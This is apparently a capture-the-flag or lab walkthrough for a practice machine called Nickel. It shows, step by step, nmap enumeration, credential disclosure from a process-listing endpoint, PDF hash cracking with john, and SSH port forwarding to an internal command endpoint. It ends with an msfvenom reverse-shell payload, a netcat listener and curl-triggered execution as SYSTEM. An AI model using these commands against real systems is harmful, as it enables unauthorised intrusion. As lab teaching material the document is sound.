Exploitation Guide for Nickel

In this walkthrough, we leverage a credential disclosure on a web application endpoint to gain an initial foothold on the target. We then crack a PDF password to gain information about a protected administrative application. Finally, we bypass firewall protections with port forwarding to gain access to this application, which allows RCE as the SYSTEM user.

## Enumeration

We'll begin with an `nmap` TCP scan against all 65535 TCP ports.

```
kali@kali:~$ sudo nmap 192.168.120.209 -p-
...
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
3389/tcp  open  ms-wbt-server
8089/tcp  open  unknown
33333/tcp open  dgi-serv

Nmap done: 1 IP address (1 host up) scanned in 140.09 seconds
```

Next, we'll run a more detailed `nmap` scan.

```
kali@kali:~$ sudo nmap 192.168.120.209 -p8089,33333 -A
...
PORT      STATE SERVICE VERSION
8089/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
...
```

This doesn't reveal much useful information. At this point, we can either use `curl` to quickly examine the source code (if any) or manually visit the services with a web browser and investigate further. We choose the former and connect to the service at port `8089` with `curl`.

```
kali@kali:~$ curl http://192.168.120.209:8089

<h1>DevOps Dashboard</h1>
<hr>
<form action='http://192.168.120.209:33333/list-current-deployments' method='GET'>
<input type='submit' value='List Current Deployments'>
</form>

<form action='http://192.168.120.209:33333/list-running-procs' method='GET'>
<input type='submit' value='List Running Processes'>
</form>

<form action='http://192.168.120.209:33333/list-active-nodes' method='GET'>
<input type='submit' value='List Active Nodes'>
</form>
```

The `curl` output reveals that the "Devops Dashboard" application contains several form actions that make requests to a _second_ endpoint on port `33333`. This was one of the open ports in the earlier `nmap` scan.

We attempt several `GET` requests to the endpoints listed in the source, but the application returns a recurring error.

```
kali@kali:~$ curl http://192.168.120.209:33333/list-current-deployments
<p>Cannot "GET" /list-current-deployments</p>

kali@kali:~$ curl http://192.168.120.209:33333/list-running-procs
<p>Cannot "GET" /list-running-procs</p>

kali@kali:~$ curl http://192.168.120.209:33333/list-active-nodes
<p>Cannot "GET" /list-active-nodes</p>
```

## Exploitation

### User Credentials Disclosure

Since the application seems to be expecting another HTTP verb, let's attempt `POST` requests instead. If we provide `curl` with a `Content-Length: 0` header, we can `POST` to the `http://192.168.120.209:33333/list-running-procs` endpoint to get a list of running processes on the machine.

```
kali@kali:~$ curl -s -i -X POST -H 'Content-Length: 0' http://192.168.120.209:33333/list-running-procs
HTTP/1.1 200 OK
Content-Length: 2629
Server: Microsoft-HTTPAPI/2.0
...
name        : smss.exe
commandline : 

name        : csrss.exe
commandline : 

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

name        : FileZilla Server.exe
commandline : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"
...
```

The process listing reveals an interesting **DevTasks.exe** process command line that seems to contain encoded or encrypted credentials for `ariah`.

```
cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
```

The command line also reveals some other potentially useful information, such as the `--protocol ssh` switch which hints at a potential pivot option.

If we base64-decode the contents of the `-p` parameter, we discover what appears to be a password:

```
kali@kali:~$ echo Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 -d
NowiseSloopTheory139
```

Next, we confirm that `ariah`'s decoded credentials are good for both FTP and SSH on this system:

```
kali@kali:~$ ssh ariah@192.168.120.209
ariah@192.168.120.209's password: 
...
ariah@NICKEL C:\Users\ariah>cd Desktop
ariah@NICKEL C:\Users\ariah\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\Users\ariah\Desktop

09/01/2020  12:38 PM    <DIR>          .
09/01/2020  12:38 PM    <DIR>          ..
09/01/2020  12:38 PM                34 local.txt  
               1 File(s)             34 bytes     
               2 Dir(s)   5,029,847,040 bytes free

ariah@NICKEL C:\Users\ariah\Desktop>
```

## Escalation

Logging into the FTP server as `ariah` (or navigating to the _C:\ftp_ directory from the SSH shell), we find an **Infrastructure.pdf** file. Let's use FTP to download the file making sure we also set the binary mode.

```
kali@kali:/tmp$ ftp 192.168.120.209
...
Name (192.168.120.209:root): ariah
331 Password required for ariah
Password:
230 Logged on
Remote system type is UNIX.
ftp> ls
...
-r--r--r-- 1 ftp ftp          46235 Sep 01 11:02 Infrastructure.pdf
ftp> bin
200 Type set to I
ftp> recv Infrastructure.pdf
...
226 Successfully transferred "/Infrastructure.pdf"
...
```

However, the **Infrastructure.pdf** file is password protected. Let's try to extract the password hash from the PDF with John the Ripper's `pdf2john.pl` utility.

```
kali@kali:/tmp$ perl /usr/share/john/pdf2john.pl Infrastructure.pdf | tee pdf_hash
Infrastructure.pdf:$pdf$4*4*128*-1060*1*16*14350d814f7c974db9234e3e719e360b*32*6aa1a24681b93038947f76796470dbb100000000000000000000000000000000*32*d9363dc61ac080ac4b9dad4f036888567a2d468a6703faf6216af1eb307921b0
```

Using `john`, let's try to crack the hash using the **rockyou.txt** wordlist.

```
kali@kali:/tmp$ john pdf_hash --wordlist=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
...
ariah4168        (Infrastructure.pdf)
1g 0:00:01:22 DONE (2020-09-18 15:38) 0.01212g/s 121263p/s 121263c/s 121263C/s ariah4168..ariadne01
...
```

Opening the **Infrastructure.pdf** file with the `ariah4168` password reveals some information about other potential targets:

```
Infrastructure Notes
Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/files
```

The `Temporary Command endpoint` at `http://nickel/?` gets our attention. This is interesting since port `80` wasn't initially identified by our earlier Nmap scan. However, `netstat -an` (run from our SSH shell) reveals that a service is running on port 80:

```
ariah@NICKEL C:\Users\ariah\Desktop>netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
...
```

Clearly this port is being blocked. We may be able to bypass this with an SSH port forward:

```
kali@kali:~$ sudo ssh -L 80:192.168.120.209:80 ariah@192.168.120.209
...
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved.

ariah@NICKEL C:\Users\ariah>
```

Once our port forward is set up, we can issue `curl` requests to `http://localhost/?` to hit the target service. After several attempts, we succeed in running operating system commands like `whoami` with this syntax:

```
kali@kali:~$ curl http://localhost/?whoami

<!doctype html><html><body>dev-api started at 2020-09-18T11:14:22

	<pre>nt authority\system
</pre>
</body></html>kali@kali:~$
```

This indicates that we can run commands as SYSTEM! Let's further this access to get an actual shell. We'll first generate a payload.

```
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.11 LPORT=443 -f exe > /tmp/payload.exe
```

We can then use our existing SSH credentials for `ariah` to upload our payload to the target directory.

```
kali@kali:~$ scp /tmp/payload.exe ariah@192.168.120.209:C:\\users\\ariah\\desktop\\payload.exe
ariah@192.168.120.209's password: 
payload.exe                                                                  100%    0     0.0KB/s   00:00
```

Let's configure a netcat listener to catch our reverse shell.

```
kali@kali:~$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Finally, we can issue the final `curl` request to execute our payload.

```
kali@kali:~$ curl -G 'http://localhost/?' --data-urlencode 'cmd /c C:\\users\\ariah\\desktop\\payload.exe'
```

Success! We caught our reverse SYSTEM shell.

```
kali@kali:~$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.118.11] from (UNKNOWN) [192.168.120.209] 49683
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami 
whoami
nt authority\system

C:\Windows\system32>
```